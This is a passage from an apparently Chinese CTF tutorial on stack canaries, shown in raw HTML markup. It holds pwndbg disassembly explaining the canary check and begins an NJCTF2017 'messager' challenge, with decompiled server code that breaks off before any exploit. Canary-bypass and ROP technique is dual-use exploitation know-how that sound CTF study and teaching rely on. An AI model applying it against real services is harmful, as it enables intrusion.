class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; disass main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Dump of assembler code for function main:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546da &amp;lt;+0&amp;gt;:	push   rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546db &amp;lt;+1&amp;gt;:	mov    rbp,rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546de &amp;lt;+4&amp;gt;:	sub    rsp,0x20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546e2 &amp;lt;+8&amp;gt;:	mov    rax,QWORD PTR fs:0x28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546eb &amp;lt;+17&amp;gt;:	mov    QWORD PTR [rbp-0x8],rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546ef &amp;lt;+21&amp;gt;:	xor    eax,eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546f1 &amp;lt;+23&amp;gt;:	lea    rax,[rbp-0x12]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546f5 &amp;lt;+27&amp;gt;:	mov    rsi,rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546f8 &amp;lt;+30&amp;gt;:	lea    rdi,[rip+0xa5]        # 0x5555555547a4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x00005555555546ff &amp;lt;+37&amp;gt;:	mov    eax,0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x0000555555554704 &amp;lt;+42&amp;gt;:	call   0x5555555545b0 &amp;lt;__isoc99_scanf@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x0000555555554709 &amp;lt;+47&amp;gt;:	nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x000055555555470a &amp;lt;+48&amp;gt;:	mov    rax,QWORD PTR [rbp-0x8]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=&amp;gt; 0x000055555555470e &amp;lt;+52&amp;gt;:	xor    rax,QWORD PTR fs:0x28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x0000555555554717 &amp;lt;+61&amp;gt;:	je     0x55555555471e &amp;lt;main+68&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x0000555555554719 &amp;lt;+63&amp;gt;:	call   0x5555555545a0 &amp;lt;__stack_chk_fail@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x000055555555471e &amp;lt;+68&amp;gt;:	leave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x000055555555471f &amp;lt;+69&amp;gt;:	ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;End of assembler dump.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		注意看8 17 和 48 52 61 63这几行, 第一部分是开头. 从fs寄存器的偏移0x28位置取出(具体请查阅其他资料)后,放入rax,然后放入rbp-0x8的位置存储canary&lt;/p&gt;
&lt;p&gt;​		函数返回前,从栈上取出来,然后做xor对比,如果一样的话,就都是0,跳转到main + 68,正常结束,如果不一样的话,就调用__stack_chk_fail函数,报错了.&lt;/p&gt;
&lt;h2 id=&#34;32位&#34;&gt;&lt;a href=&#34;#32位&#34; class=&#34;headerlink&#34; title=&#34;32位&#34;&gt;&lt;/a&gt;32位&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; disass main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Dump of assembler code for function main:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x5655559d &amp;lt;+0&amp;gt;:	lea    ecx,[esp+0x4]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555a1 &amp;lt;+4&amp;gt;:	and    esp,0xfffffff0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555a4 &amp;lt;+7&amp;gt;:	push   DWORD PTR [ecx-0x4]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555a7 &amp;lt;+10&amp;gt;:	push   ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555a8 &amp;lt;+11&amp;gt;:	mov    ebp,esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555aa &amp;lt;+13&amp;gt;:	push   ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555ab &amp;lt;+14&amp;gt;:	push   ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555ac &amp;lt;+15&amp;gt;:	sub    esp,0x10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555af &amp;lt;+18&amp;gt;:	call   0x565555f9 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555b4 &amp;lt;+23&amp;gt;:	add    eax,0x1a20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555b9 &amp;lt;+28&amp;gt;:	mov    ecx,DWORD PTR gs:0x14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555c0 &amp;lt;+35&amp;gt;:	mov    DWORD PTR [ebp-0xc],ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555c3 &amp;lt;+38&amp;gt;:	xor    ecx,ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555c5 &amp;lt;+40&amp;gt;:	sub    esp,0x8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555c8 &amp;lt;+43&amp;gt;:	lea    edx,[ebp-0x16]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555cb &amp;lt;+46&amp;gt;:	push   edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555cc &amp;lt;+47&amp;gt;:	lea    edx,[eax-0x1934]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555d2 &amp;lt;+53&amp;gt;:	push   edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555d3 &amp;lt;+54&amp;gt;:	mov    ebx,eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555d5 &amp;lt;+56&amp;gt;:	call   0x56555440 &amp;lt;__isoc99_scanf@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=&amp;gt; 0x565555da &amp;lt;+61&amp;gt;:	add    esp,0x10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555dd &amp;lt;+64&amp;gt;:	nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555de &amp;lt;+65&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555e1 &amp;lt;+68&amp;gt;:	xor    eax,DWORD PTR gs:0x14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555e8 &amp;lt;+75&amp;gt;:	je     0x565555ef &amp;lt;main+82&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555ea &amp;lt;+77&amp;gt;:	call   0x56555670 &amp;lt;__stack_chk_fail_local&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555ef &amp;lt;+82&amp;gt;:	lea    esp,[ebp-0x8]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555f2 &amp;lt;+85&amp;gt;:	pop    ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555f3 &amp;lt;+86&amp;gt;:	pop    ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555f4 &amp;lt;+87&amp;gt;:	pop    ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555f5 &amp;lt;+88&amp;gt;:	lea    esp,[ecx-0x4]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x565555f8 &amp;lt;+91&amp;gt;:	ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;End of assembler dump.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		关注28,35和65 - 77这几行,和64位的基本一样,就是canary的来源不同&lt;/p&gt;
&lt;h1 id=&#34;题目练习&#34;&gt;&lt;a href=&#34;#题目练习&#34; class=&#34;headerlink&#34; title=&#34;题目练习&#34;&gt;&lt;/a&gt;题目练习&lt;/h1&gt;&lt;h2 id=&#34;NJCTF2017-messager&#34;&gt;&lt;a href=&#34;#NJCTF2017-messager&#34; class=&#34;headerlink&#34; title=&#34;NJCTF2017:messager&#34;&gt;&lt;/a&gt;NJCTF2017:messager&lt;/h2&gt;&lt;p&gt;​		64位程序&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20230226093403660.png&#34; alt=&#34;image-20230226093403660&#34;&gt;&lt;/p&gt;
&lt;p&gt;开了canary,要想办法绕过,然后开了nx,栈不可执行,要用rop之类的&lt;/p&gt;
&lt;p&gt;反汇编函数挺长的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 a1, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a2, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; optval; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;__pid_t&lt;/span&gt; v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v6; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_400B76(a1, a2, a3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+]start..&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  addr.sa_family = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *(_WORD *)addr.sa_data = htons(&lt;span class=&#34;number&#34;&gt;0x15B3&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *(_DWORD *)&amp;amp;addr.sa_data[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = htonl(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  len = &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  addr_len = &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+]socket..&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dword_602140 = socket(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( dword_602140 &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;socket&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  optval = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setsockopt(dword_602140, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &amp;amp;optval, &lt;span class=&#34;number&#34;&gt;4u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+]bind..&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( bind(dword_602140, &amp;amp;addr, len) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;bind error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span 